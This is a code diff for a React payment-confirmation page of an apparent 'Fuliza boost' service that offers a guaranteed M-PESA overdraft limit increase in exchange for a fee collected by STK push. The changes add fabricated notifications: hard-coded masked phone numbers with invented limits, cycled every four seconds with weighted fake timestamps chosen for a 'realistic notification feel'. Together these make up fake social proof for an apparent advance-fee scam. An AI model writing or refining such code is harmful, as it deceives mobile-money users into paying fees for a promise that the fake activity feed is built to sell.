@@ -2,14 +2,71 @@ import { useLocation, useNavigate } from "react-router-dom";
 import { useEffect, useState } from "react";
 import "../styles/Confirmation.css";
 
+const notifications = [
+  { phone: "0708****85", limit: 45000 },
+  { phone: "0712****34", limit: 30000 },
+  { phone: "0722****91", limit: 25000 },
+  { phone: "0733****56", limit: 35000 },
+  { phone: "0745****23", limit: 20000 },
+  { phone: "0756****78", limit: 15000 },
+  { phone: "0767****12", limit: 40000 },
+  { phone: "0778****45", limit: 25000 },
+  { phone: "0789****67", limit: 30000 },
+  { phone: "0791****89", limit: 45000 },
+];
+
+// Weighted times for realistic notification feel
+const notificationTimes = [
+  { label: "just now", weight: 50 },
+  { label: "3 mins ago", weight: 25 },
+  { label: "5 mins ago", weight: 15 },
+  { label: "6 mins ago", weight: 7 },
+  { label: "10 mins ago", weight: 3 },
+];
+
+// Helper function to pick weighted random time
+const getRandomTime = () => {
+  const totalWeight = notificationTimes.reduce((sum, t) => sum + t.weight, 0);
+  let rand = Math.random() * totalWeight;
+
+  for (const t of notificationTimes) {
+    if (rand < t.weight) return t.label;
+    rand -= t.weight;
+  }
+  return "just now";
+};
+
 const Confirmation = () => {
   const navigate = useNavigate();
   const { state } = useLocation();
-  const { limit, fee, phone,username } = state || {};
+  const { limit, fee, phone, username } = state || {};
 
   const [loading, setLoading] = useState(false);
   const [message, setMessage] = useState<string | null>(null);
- 
+
+  const [currentNotification, setCurrentNotification] = useState({
+    ...notifications[0],
+    time: "just now",
+  });
+  const [showNotification, setShowNotification] = useState(true);
+
+  // Change notification every 4 seconds with weighted times
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setShowNotification(false);
+
+      setTimeout(() => {
+        const randomIndex = Math.floor(Math.random() * notifications.length);
+        setCurrentNotification({
+          ...notifications[randomIndex],
+          time: getRandomTime(),
+        });
+        setShowNotification(true);
+      }, 300);
+    }, 4000);
+
+    return () => clearInterval(interval);
+  }, []);
 
   const handlePay = async () => {
     if (!phone || !fee) {
@@ -21,15 +78,18 @@ const Confirmation = () => {
     setMessage(null);
 
     try {
-      const response = await fetch("https://fulizaboost-f4ry.onrender.com/api/boosts/pay", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          phone,
-          fee,
-          customer_name:username 
-        }),
-      });
+      const response = await fetch(
+        "https://fulizaboost-f4ry.onrender.com/api/boosts/pay",
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            phone,
+            fee,
+            customer_name: username,
+          }),
+        }
+      );
 
       const data = await response.json();
       setLoading(false);
@@ -48,37 +108,6 @@ const Confirmation = () => {
     }
   };
 
-   const notifications = [
-  { phone: "0708****85", limit: 45000 },
-  { phone: "0712****34", limit: 30000 },
-  { phone: "0722****91", limit: 25000 },
-  { phone: "0733****56", limit: 35000 },
-  { phone: "0745****23", limit: 20000 },
-  { phone: "0756****78", limit: 15000 },
-  { phone: "0767****12", limit: 40000 },
-  { phone: "0778****45", limit: 25000 },
-  { phone: "0789****67", limit: 30000 },
-  { phone: "0791****89", limit: 45000 },
-];
-
- const [currentNotification, setCurrentNotification] = useState(notifications[0]);
-  const [showNotification, setShowNotification] = useState(true);
-
-  // Change notification every 4 seconds
-    useEffect(() => {
-      const interval = setInterval(() => {
-        setShowNotification(false);
-        
-        setTimeout(() => {
-          const randomIndex = Math.floor(Math.random() * notifications.length);
-          setCurrentNotification(notifications[randomIndex]);
-          setShowNotification(true);
-        }, 300);
-      }, 4000);
-  
-      return () => clearInterval(interval);
-    }, []);
-
   return (
     <main className="cf-container">
       {/* HEADER */}
@@ -94,21 +123,22 @@ const Confirmation = () => {
         <p className="subtitle">Instant Limit Increase • Guaranteed Approval</p>
       </div>
 
-        {/* NOTIFICATION OVERLAY */}
-      <div className={`notification-overlay ${showNotification ? 'show' : ''}`}>
+      {/* NOTIFICATION OVERLAY */}
+      <div className={`notification-overlay ${showNotification ? "show" : ""}`}>
         <div className="notification-icon"></div>
         <div className="notification-content">
-          <strong>{currentNotification.phone}</strong> increased to Ksh {currentNotification.limit.toLocaleString()}
-          <div className="notification-time">• just now</div>
+          <strong>{currentNotification.phone}</strong> increased to Ksh{" "}
+          {currentNotification.limit.toLocaleString()}
+          <div className="notification-time">• {currentNotification.time}</div>
         </div>
       </div>
-
-      
 
       <hr />
 
       <h2 className="review-title">Review Request</h2>
-      <p className="review-text">Please confirm your selection before we initiate the STK push.</p>
+      <p className="review-text">
+        Please confirm your selection before we initiate the STK push.
+      </p>
 
       {/* SUMMARY CARD */}
       <div className="summary-card">
@@ -137,13 +167,13 @@ const Confirmation = () => {
       </div>
 
       {/* STK PUSH LOADER */}
-{loading && (
-  <div className="stk-loader">
-    <div className="stk-spinner"></div>
-    <p>Initiating M-PESA STK Push…</p>
-    <span>Please check your phone</span>
-  </div>
-)}
+      {loading && (
+        <div className="stk-loader">
+          <div className="stk-spinner"></div>
+          <p>Initiating M-PESA STK Push…</p>
+          <span>Please check your phone</span>
+        </div>
+      )}
     </main>
   );
 };
